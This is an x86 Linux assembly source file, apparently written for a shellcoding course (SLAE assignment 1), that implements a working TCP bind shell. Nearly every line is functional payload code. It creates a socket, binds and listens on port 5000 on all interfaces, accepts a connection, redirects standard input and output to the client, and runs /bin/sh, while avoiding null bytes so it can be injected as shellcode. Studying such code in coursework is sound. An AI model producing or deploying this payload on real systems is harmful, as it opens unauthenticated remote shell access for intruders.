; Author: Mike West
; Purpose: TCP bind shell for assignment1 of SLAE

global _start
section .text

_start:
	xor eax, eax		; Zero out registers
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor edi, edi

	; Setup Socket call
	mov bl, 0x2    		; AF_INET
	inc cl         		; SOCK_STREAM = 1 - Leave EDX 0 for IP
	mov ax, 0x0167 		; Socket syscall number
	int 0x80		; make call

	xchg edi, eax   	; store socketfd
	
	; Now call bind
	push edx		; INADDR_ANY - IP to bind to in soccaddr_in
	push word 0x8813	; Port in Network byte order
	push word bx  		; Address Family AF_INET
	mov ecx, esp		; get pointer to structure  
	xchg ebx, edi		; put server socket fd into ebx (use xchg to save a byte)
	mov dl, 0x10   		; set struct len
	mov ax, 0x0169 		; bind syscall
	int 0x80		; make call

	; Call listen
	xchg ecx, edx		; set up the backlog parameter
	mov ax, 0x016B		; set syscall number for listen
	int 0x80		; make the call

	xor ecx, ecx		; zero out registers
	xor esi, esi
	mov ax, 0x016c		; set accept syscall
	int 0x80		; make the call
	xchg ebx, eax		; store the client socket fd in ebx so we can use for the dup call

	mov cl, 0x2
loop:
	mov al, 0x3f		; setup dup2 call
	int 0x80		; call dup2
	dec ecx			; decrement the loop counter
	jns loop		; if the sign flag is not set then repeat the loop
				; this will tie our stdin, out and error to the client socket

	xor eax, eax
	push eax        	; push NULL onto stack to termins //bin/sh
	push 0x68732f6e 	; push //bin/sh in reverse onto the stack
	push 0x69622f2f 	; see above
	mov  ebx, esp   	; move address of //bin/sh into EBX (execve's 1st parameter)
        push eax        	; this serves two purposes 1, to use for EDX (we will pass no
                  		; environment to the shell and also as part of the array of
                  		; args that we will pass to as the 2nd arg of execve
	mov  edx, esp	  	; see above
	push ebx        	; ESP now points to and array of args [address of //bin/sh, 0x00]
                  		; these will act as the args to //bin/sh
        mov ecx, esp	  	; setup the 3rd argument
	mov al, 0x0b      	; set the EAX register to the execve sys call number
                  		; using al to remove any null bytes
	int 0x80        	; make the call
